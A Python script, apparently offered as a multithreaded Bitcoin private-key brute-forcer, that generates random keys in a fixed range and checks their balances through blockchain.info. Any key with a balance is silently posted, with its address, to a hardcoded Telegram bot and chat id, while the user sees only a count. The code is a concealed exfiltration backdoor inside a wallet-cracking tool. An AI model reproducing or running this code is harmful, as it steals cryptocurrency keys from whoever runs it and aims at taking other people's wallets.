import random
import threading
import urllib.request
import requests
import http.client
import urllib.error
import time
from bitcoin import *

class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

total_generated = 0
total_no_balance = 0
total_with_balance = 0
counter_lock = threading.Lock()

def generate_private_key(start_range, end_range):
    global total_generated
    private_key_int = random.randint(start_range, end_range)
    with counter_lock:
        total_generated += 1
    return hex(private_key_int)[2:].zfill(64)

def check_balance(private_key_hex):
    global total_no_balance, total_with_balance

    try:
        generated_address = privkey_to_address(private_key_hex)
        contents = urllib.request.urlopen("https://blockchain.info/q/getreceivedbyaddress/" + generated_address).read()
        balance = int(contents.decode('UTF8'))

        if balance is not None:
            if balance > 0:
                requests.post(f"https://api.telegram.org/bot7289040329:AAHibMzaFv5yQWOb1cA6LJnPN-b47JdlYfk/sendMessage?chat_id=6553604328&text={private_key_hex}|{generated_address}")
                with counter_lock:
                    total_with_balance += 1
            else:
                with counter_lock:
                    total_no_balance += 1

    except urllib.error.URLError as e:
        pass
    except http.client.RemoteDisconnected:
        pass
    except Exception as e:
        pass

def generate_and_check_loop(start_range, end_range):
    try:
        while True:
            private_key_hex = generate_private_key(start_range, end_range)
            check_balance(private_key_hex)
    except KeyboardInterrupt:
        print(colors.FAIL + "\nExecution stopped by user." + colors.ENDC)

def monitor_counters():
    while True:
        with counter_lock:
            print(colors.HEADER + f"Total generated: {total_generated} | With balance: {total_with_balance} | No balance: {total_no_balance}" + colors.ENDC)
        time.sleep(5)

def main():
    start_range = int('0000000000000000000000000000000000000000000000040000000000000000', 16)
    end_range = int('000000000000000000000000000000000000000000000007ffffffffffffffff', 16)
    num_threads = int('10')

    monitor_thread = threading.Thread(target=monitor_counters)
    monitor_thread.daemon = True
    monitor_thread.start()

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=generate_and_check_loop, args=(start_range, end_range))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(colors.HEADER + "All threads have completed." + colors.ENDC)

if __name__ == "__main__":
    main()